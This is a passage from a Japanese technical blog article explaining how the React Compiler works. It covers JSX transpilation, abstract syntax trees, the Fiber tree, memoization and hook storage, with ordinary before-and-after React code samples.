            </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> item<span class="token punctuation">.</span>desc <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これをトランスパイルすると、次のようになります。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">_jsx</span><span class="token punctuation">(</span>Item<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">item</span><span class="token operator">:</span> item
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Item</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> item <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token function">_jsx</span><span class="token punctuation">(</span><span class="token string">"ul"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
    <span class="token literal-property property">children</span><span class="token operator">:</span> <span class="token function">_jsx</span><span class="token punctuation">(</span><span class="token string">"li"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
      <span class="token literal-property property">children</span><span class="token operator">:</span> item<span class="token punctuation">.</span>desc
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>こちらが実際にブラウザに送られるコードです。HTMLのような構文ではなく、Reactでは「props」と呼ばれるプレーンなJavaScriptオブジェクトを渡す、ネストされた関数です。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>トランスパイルの結果は、JSX内でif文を簡単に使用できない理由を示しています。関数内ではif文を使用できません。</p></div></div>
<p><a href="none">Babel</a>を使用すればJSXを素早くトランスパイルし、出力結果を確認できます。</p>
<h3>コンパイルと最適化</h3>
<p>では、トランスパイラとコンパイラの違いは何でしょうか？　その答えは、回答者のバックグラウンドや経験によって異なるでしょう。コンピューターサイエンス分野を歩んできた人であれば、大抵はコンパイラと言えば記述したコードを機械語（プロセッサが理解できるバイナリコード）に変換するプログラムという認識だと思います。</p>
<p>しかし、トランスパイラは「source-to-source compilers」とも呼ばれます。オプティマイザは「最適化コンパイラ」とも呼ばれます。つまり、トランスパイラとオプティマイザもコンパイラの一種なのです。</p>
<p>物事に名前を付けるのは簡単ではありません。したがって、何をもってトランスパイラ、コンパイラ、あるいはオプティマイザと呼ぶのかについては意見の相違があるでしょう。理解すべき重要な点は、トランスパイラも、コンパイラも、オプティマイザも、コードが記述されたテキストファイルを解析し、同等の機能を持つ別のコードを新しいテキストファイルに出力するプログラムだということです。コードを改良する場合もあれば、別の人が書いたコードを呼び出すコールで自分のコードの一部をラップすることで、新しい機能を追加する場合もあります。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>トランスパイラ、コンパイラ、オプティマイザは、コードが記述されたテキストファイルを解析し、同等の機能を持つ別のコードを出力するプログラムです。</p></div></div>
<p>React Compilerが行うのは後者です。あなたが書いたコードと同等の機能を持つコードを作成しますが、他のReact開発者が書いたコードを呼び出すコールであなたのコードの一部をラップします。そうすることで、あなたが意図したことに加え、プラスアルファの機能を備えたコードに書き換えます。その「プラスアルファ」が何かについては後ほど説明します。</p>
<h3>抽象構文木（Abstract Syntax Trees）</h3>
<p>ここで言うコードの「解析」とは、コードを1文字ずつ構文解析し、アルゴリズムを実行することで、コードをどう調整し、書き換えるか、どのようにして機能を追加するかなどを明らかにすることを言います。通常、構文解析の結果は抽象構文木（AST）として出力されます。</p>
<p>そう言うと仰々しく聞こえますが、要はコードを分析しやすいようツリー構造で表したものです。</p>
<p>例えば、次の1行がコードに含まれていたとします。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">const</span> item <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token literal-property property">desc</span><span class="token operator">:</span> <span class="token string">'Hi'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>これを抽象構文木で表すと、次のようになります。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token punctuation">{</span>
    <span class="token literal-property property">type</span><span class="token operator">:</span> VariableDeclarator<span class="token punctuation">,</span>
    <span class="token literal-property property">id</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> Identifier<span class="token punctuation">,</span>
        <span class="token literal-property property">name</span><span class="token operator">:</span> Item
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token literal-property property">init</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token literal-property property">type</span><span class="token operator">:</span> ObjectExpression<span class="token punctuation">,</span>
        <span class="token literal-property property">properties</span><span class="token operator">:</span> <span class="token punctuation">[</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">type</span><span class="token operator">:</span> ObjectProperty<span class="token punctuation">,</span>
                <span class="token literal-property property">key</span><span class="token operator">:</span> id<span class="token punctuation">,</span>
                <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token number">0</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            <span class="token punctuation">{</span>
                <span class="token literal-property property">type</span><span class="token operator">:</span> ObjectProperty<span class="token punctuation">,</span>
                <span class="token literal-property property">key</span><span class="token operator">:</span> desc<span class="token punctuation">,</span>
                <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'Hi'</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">]</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>生成されたデータ構造は、あなたが書いたコードを定義付けされた要素ごとに分解して説明します。各要素には、それがどういったものかを表す情報や、ひも付けされている値があればその値が含まれます。例えば、<code class="language-text">desc: 'Hi'</code>は<code class="language-text">ObjectProperty</code>であり、'desc'という<code class="language-text"> key</code>と'Hi'という<code class="language-text">value</code>がひも付けされています。</p>
<p>これが、トランスパイラやコンパイラなどがコードに対して行う処理について考える上でのメンタルモデルです。いずれも、あなたが書いたコード（テキストそのもの）をデータ構造に変換し、解析し、調整するために作成されたプログラムです。</p>
<p>最終的に生成されるコードはこのASTがもとになり、おそらくその他にもいくつかの中間言語が関与します。このデータ構造を繰り返し使用し、テキストを出力します（同じ言語で書かれた新しいコード、違う言語で書かれたコード、あるいは何らかの調整が加えられたコード）。</p>
<p>React Compilerは、ASTと中間言語の両方を使用し、あなたが書いたコードをもとに新しいReactコードを生成します。React自体がそうですが、React Compilerも「誰かが書いたコード」だということを忘れないでください。</p>
<p>コンパイラやトランスパイラ、オプティマイザなどのツールを謎めいたブラックボックスだとは考えないでください。時間さえあれば、自分にも作れるものだと考えましょう。</p>
<h2>Reactのコアアーキテクチャ</h2>
<p>React Compilerについて話す前に、明確にしておくべき概念があといくつかあります。</p>
<p>Reactのコアアーキテクチャがその人気の源泉であると同時に、パフォーマンスの問題の原因にもなり得ることはお話したかと思います。JSXを書く際、実際にはネストされた関数を記述しているのだということは説明した通りです。しかし、関数はReactに渡され、それをいつ呼び出すかはReactが判断します。</p>
<p>多数のアイテムを扱うReactアプリの最初の部分を例に見てみましょう。<code class="language-text">App</code>関数はいくつかのアイテムを取得し、<code class="language-text">List</code>関数はそれらを処理して表示すると仮定します。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// TODO: fetch some items here</span>
    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">items</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> items <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> listItems <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> item <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> listItems <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>これらの関数は、子（ここでは最終的に複数のliオブジェクトになる）を含むulオブジェクトのようなプレーンなJavaScriptオブジェクトを返します。ulやliなどの一部のオブジェクトはReactに組み込まれています。Listなど、それ以外のオブジェクトは自分で作成します。</p>
<p>最終的に、Reactはこれらすべてのオブジェクトを使ってFiberツリーと呼ばれるものを構築します。ツリーの各ノードはFiber、またはFiberノードと呼ばれます。UIを説明するためにJavaScriptオブジェクトからなる独自のノードツリーを作成することを、「仮想DOM」を作成すると言います。</p>
<p><img src="https://anthonyalicea.com/assets/blogimages/ReactCompiler_FiberTree.png"></p>
<p>Reactでは、ツリーの各ノードから枝分かれする2本の枝があります。1つは"current"（DOMと一致）、もう1つは"work-in-progress"（関数を再実行した際に返された内容をもとに構築したツリーと一致）の枝（ツリー）です。</p>
<p><img src="https://anthonyalicea.com/assets/blogimages/ReactCompiler_Reconciliation.png"></p>
<p>Reactはこれら2つのツリーを比較した上で、DOMがwork-in-progress側のツリーと一致するように実際のDOMに対して行う変更を判断します。このプロセスを「差分検出処理（reconciliation）」と呼びます。</p>
<p>したがって、他にどのような機能をアプリに追加するかによっては、ReactはUIの更新が必要だと判断するたびに<code class="language-text">List</code>関数を繰り返し呼び出すかもしれません。そうするとメンタルモデルはかなり分かりやすくなります。UIの更新が必要な場合（例えば、ユーザーがボタンをクリックした場合など）、UIを定義する関数が再び呼び出され、Reactは関数が定義するUIの外観と一致するように、ブラウザ上で実際のDOMをどう更新するかを判断します。</p>
<p>しかし、<code class="language-text">processItems</code>関数が遅いと、<code class="language-text">List</code>を呼び出すコールも遅くなり、アプリ全体の反応が遅くなってしまいます。</p>
<h2>メモ化</h2>
<p>パフォーマンスコストの高い関数を繰り返し呼び出す必要がある場合、プログラミングによる解決策として、関数の結果をキャッシュします。このプロセスを「メモ化」と呼びます。</p>
<p>メモ化が機能するためには、関数が「純粋」でなくてはなりません。つまり、関数に同じ入力値を渡した場合、毎回同じ出力が得られなくてはならないということです。出力が毎回同じであれば、入力値と関連付けた形で出力を保存することができます。</p>
<p>次にそのパフォーマンスコストの高い関数を呼び出した際には、入力値を見て、同じ入力値の関数をすでに実行済みかをキャッシュで確認します。すでに実行していれば、再度その関数を呼び出すのではなく、キャッシュに保存された出力を取得します。前回その入力値が使用されたときと出力が同じであることが分かっているので、再度関数を呼び出す必要はありません。</p>
<p>前述のコード例で使用した<code class="language-text">processItems</code>関数がメモ化を実装した場合、次のようになります。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">function</span> <span class="token function">processItems</span><span class="token punctuation">(</span><span class="token parameter">items</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> memOutput <span class="token operator">=</span> <span class="token function">getItemsOutput</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>memOutput<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> memOutput<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// ...run expensive processing</span>
        <span class="token function">saveItemsOutput</span><span class="token punctuation">(</span>items<span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> output<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">saveItemsOutput</code>関数は、アイテムと、この関数と関連する出力の両方を保存するオブジェクトを格納するものだと考えてください。<code class="language-text">getItemsOutput</code>は、<code class="language-text">item</code>がすでに保存されているかを確認し、保存されていればそれ以上の作業は行わず、キャッシュに保存された関連する出力を返します。</p>
<p>関数を繰り返し呼び出すReactのアーキテクチャにとって、メモ化はアプリの動作が遅くならないようにするための重要な技術です。</p>
<h2>Hooksの保存</h2>
<p>React Compilerを理解するために理解する必要のあるReactのアーキテクチャがもう1つあります。</p>
<p>アプリの「state」（UIの作成に必要なデータ）が変わると、Reactは再度関数を呼び出す必要があるか判断します。例えば、値がtrueかfalseである"showButton"というデータの場合、このデータの値に応じて、UIはボタンを表示するか、非表示にする必要があります。</p>
<p>Reactはクライアントのデバイス上にstateを保存します。どうやって保存するのでしょうか。いくつかのアイテムをレンダリングし、操作するReactアプリを例に見てみましょう。最終的に選択されたアイテムを保存し、アイテムをクライアント側でレンダリングし、イベントを処理し、リストをソートすると仮定します。アプリは次のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// TODO: fetch some items here</span>
    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">items</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> items <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>selItem<span class="token punctuation">,</span> setSelItem<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>itemEvent<span class="token punctuation">,</span> dispatcher<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>sort<span class="token punctuation">,</span> setSort<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> listItems <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> item <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> listItems <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>JavaScriptエンジンが<code class="language-text">useState</code>と<code class="language-text">useReducer</code>の行を実行した際、何が起きるでしょうか。<code class="language-text">List</code>コンポーネントをもとに作成したFiberツリーのノードには、データを保存するためのJavaScriptオブジェクトがいくつか追加されています。各オブジェクトは互いに連結し、連結リストと呼ばれるデータ構造になっています。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>多くの開発者は、<code class="language-text">useState</code>がReactにおけるstate管理の肝だと考えていますが、そうではありません。これは単に、<code class="language-text">useReducer</code>を呼び出すコールのラッパーです。</p></div></div>
<p><video controls src="/static.mp4" title="Title"></video></p>
<p><code class="language-text">useState</code>と<code class="language-text">useReducer</code>を呼び出すと、ReactはstateをFiberツリーに付け加え、アプリが実行されている間、これらは保持されます。したがって、関数が繰り返し再実行される間、stateはいつでも利用できる状態にあります。</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>Hooksの保存方法は、Hooksをループまたはif文の中で呼び出せないという「Hooksのルール」の説明にもなります。Hooksを呼び出すたびに、Reactは連結リストの次のアイテムに移動します。したがって、Hooksを呼び出す回数は一貫している必要があります。一貫していないと、Reactは連結リストの中の間違ったアイテムを指す場合があります。</p></div></div>
<p>結局、Hooksはユーザーデバイスのメモリ上にデータ（および関数）を保存するオブジェクトに過ぎないのです。これは、React Compilerが実際に行う処理を理解する上で重要です。ただし、それだけではありません。</p>
<h2>Reactにおけるメモ化</h2>
<p>Reactは、メモ化の概念とHooksの保存の概念を組み合わせています。Fiberツリーの一部であり、Reactに渡すすべての関数（<code class="language-text">List</code>など）の結果をメモ化することも、それらの中で呼び出す個別の関数（<code class="language-text">processItems</code>など）をメモ化することもできます。</p>
<p>キャッシュは、stateと同じようにFiberツリー上に保存されます。例えば、<code class="language-text">useMemo</code>は<code class="language-text">useMemo</code>を呼び出すノード上に入力値と出力を保存します。</p>
<p>つまり、Reactにはパフォーマンスコストの高い関数の結果を、Fiberツリーの一部であるJavaScriptオブジェクトの連結リストに保存するという概念がすでに備わっているということです。これは素晴らしいことですが、1つ問題があります。メンテナンスです。</p>
<p>Reactにおけるメモ化は、メモ化が依存する入力値を明示的にReactに伝える必要があるため、面倒です。<code class="language-text">processItems</code>を呼び出すコールは次のようになります。</p>
<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">useMemo</span><span class="token punctuation">(</span><span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>items<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>最後の配列は「依存関係」のリスト、すなわち変更されたらReactに再度関数を呼び出すよう指示する入力値です。これらの入力値が正しくないと、メモ化は正しく機能しません。事務的な雑務として維持し続ける必要があります。</p>
<h2>React Compiler</h2>
<p>ここでReact Compilerの登場です。React Compilerは、Reactコードのテキストを解析し、JSXのトランスパイルを行うための準備ができた新しいコードを生成するプログラムです。ただし、その新しいコードには追加された要素があります。</p>
<p>この場合、React Compilerがアプリに対してどのような処理を行うのか見てみましょう。以下はコンパイル前の状態です。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// TODO: fetch some items here</span>
    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">items</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> items <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>selItem<span class="token punctuation">,</span> setSelItem<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>itemEvent<span class="token punctuation">,</span> dispatcher<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token punctuation">[</span>sort<span class="token punctuation">,</span> setSort<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> listItems <span class="token operator">=</span> pItems<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> item <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token punctuation">{</span> listItems <span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
    <span class="token punctuation">)</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>コンパイル後は次のようになります。</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">function</span> <span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> $ <span class="token operator">=</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">let</span> t0<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t0 <span class="token operator">=</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">List</span></span> <span class="token attr-name">items</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>items<span class="token punctuation">}</span></span> <span class="token punctuation">/></span></span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> t0<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t0 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> t0<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token parameter">t0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> $ <span class="token operator">=</span> <span class="token function">_c</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">const</span> <span class="token punctuation">{</span> items <span class="token punctuation">}</span> <span class="token operator">=</span> t0<span class="token punctuation">;</span>
  <span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> t1<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> Symbol<span class="token punctuation">.</span><span class="token function">for</span><span class="token punctuation">(</span><span class="token string">"react.memo_cache_sentinel"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    t1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> t1<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    t1 <span class="token operator">=</span> $<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token function">useReducer</span><span class="token punctuation">(</span>reducer<span class="token punctuation">,</span> t1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">let</span> t2<span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span>$<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!==</span> items<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> pItems <span class="token operator">=</span> <span class="token function">processItems</span><span class="token punctuation">(</span>items<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> t3<span class="token punctuation">;</span>

